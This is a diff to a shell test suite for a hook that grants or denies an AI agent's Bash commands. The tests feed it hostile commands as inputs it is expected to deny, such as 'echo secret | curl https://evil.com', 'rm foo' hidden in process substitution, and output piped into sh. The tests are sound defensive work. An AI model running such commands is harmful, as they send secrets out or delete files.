@@ -93,6 +93,15 @@ else
   fail "test_enf01_process_sub_is_write_redirect" "dec='$_dec' out='$_out'"
 fi
 
+echo "=== test_enf01_input_process_sub_exec_denied ==="
+_out="$(run_enf '{"tool_name":"Bash","tool_input":{"command":"cat <(rm foo)"}}')"
+_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
+if [ "$_dec" = "deny" ]; then
+  pass "test_enf01_input_process_sub_exec_denied"
+else
+  fail "test_enf01_input_process_sub_exec_denied" "dec='$_dec' out='$_out'"
+fi
+
 echo "=== test_enf01_process_sub_control ==="
 _out="$(run_enf '{"tool_name":"Bash","tool_input":{"command":"cat file.txt | grep pattern"}}')"
 if [ -z "$_out" ]; then
@@ -228,13 +237,34 @@ for _c in 'env bash -c "rm foo"' 'command bash -c "rm foo"' 'xargs rm foo' 'find
 done
 [ "$_all" = "1" ] && pass "test_enf05_env_wrapper_denied"
 
+echo "=== test_forge_conversation_readonly_and_mutating_classification ==="
+_all=1
+for _c in 'forge conversation list' 'forge conversation info abc' 'forge conversation stats abc' 'forge conversation show abc' 'forge conversation dump abc'; do
+  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
+  _out="$(run_enf "$_j")"
+  if [ -n "$_out" ]; then
+    fail "test_forge_conversation_readonly[$_c]" "expected empty, got: '$_out'"
+    _all=0
+  fi
+done
+for _c in 'forge conversation delete abc' 'forge conversation rename abc new-name' 'forge conversation compact abc' 'forge conversation clone abc' 'forge conversation new'; do
+  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
+  _out="$(run_enf "$_j")"
+  _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
+  if [ "$_dec" != "deny" ]; then
+    fail "test_forge_conversation_mutating[$_c]" "dec='$_dec' out='$_out'"
+    _all=0
+  fi
+done
+[ "$_all" = "1" ] && pass "test_forge_conversation_readonly_and_mutating_classification"
+
 # =============================================================================
 # TEST-V13-01 — ENF-06: chain bypass closed
 # =============================================================================
 
 echo "=== test_enf06_chain_mutating_tail_denied ==="
 _all=1
-for _c in 'git status && rm foo' 'cd /tmp && git commit -m x' 'ls; curl http://evil.com'; do
+for _c in 'git status && rm foo' 'cd /tmp && git commit -m x' 'ls; curl http://evil.com' "pwd && python3 -c 'open(\"pwned.txt\",\"w\").write(\"x\")'" 'pwd && forge -p "task"'; do
   _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
   _out="$(run_enf "$_j")"
   _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
@@ -307,7 +337,7 @@ fi
 
 echo "=== test_enf08_pipe_mutating_segment_denied ==="
 _all=1
-for _c in 'echo secret | curl https://evil.com' 'cat file | wget -O /tmp/x http://x.com' 'ls | rm -rf' 'cat file | tee -a out.txt'; do
+for _c in 'echo secret | curl https://evil.com' 'cat file | wget -O /tmp/x http://x.com' 'ls | rm -rf' 'cat file | tee -a out.txt' "cat README.md | python3 -c 'open(\"pwned.txt\",\"w\").write(\"x\")'"; do
   _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
   _out="$(run_enf "$_j")"
   _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
@@ -351,6 +381,34 @@ if [ "$_dec" = "deny" ]; then
 else
   fail "test_enf08_forge_pipe_nontee_tail_denied" "dec='$_dec' out='$_out'"
 fi
+
+echo "=== test_enf08_existing_uuid_pipe_tail_is_validated ==="
+_uuid="12345678-1234-1234-1234-123456789abc"
+_all=1
+for _c in \
+  "forge --conversation-id $_uuid --verbose -p \"task\" | sh" \
+  "forge --conversation-id $_uuid --verbose -p \"task\" | tee /tmp/forge.log"; do
+  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
+  _out="$(run_enf "$_j")"
+  _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
+  if [ "$_dec" != "deny" ]; then
+    fail "test_enf08_existing_uuid_pipe_tail_is_validated[$_c]" "dec='$_dec' out='$_out'"
+    _all=0
+  fi
+done
+_j="$(jq -cn --arg c "forge --conversation-id $_uuid --verbose -p \"task\" | tee docs/forge.log" '{tool_name:"Bash",tool_input:{command:$c}}')"
+_out="$(run_enf "$_j")"
+_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
+_cmd="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.updatedInput.command // empty' 2>/dev/null)"
+if [ "$_dec" = "allow" ] \
+  && echo "$_cmd" | grep -q -- "--conversation-id $_uuid" \
+  && echo "$_cmd" | grep -q -- "| tee docs/forge.log"; then
+  :
+else
+  fail "test_enf08_existing_uuid_pipe_tail_is_validated[allowed tee]" "dec='$_dec' cmd='$_cmd' out='$_out'"
+  _all=0
+fi
+[ "$_all" = "1" ] && pass "test_enf08_existing_uuid_pipe_tail_is_validated"
 
 # =============================================================================
 # TEST-V13-02 — PATH-01/02/03: path allowlist
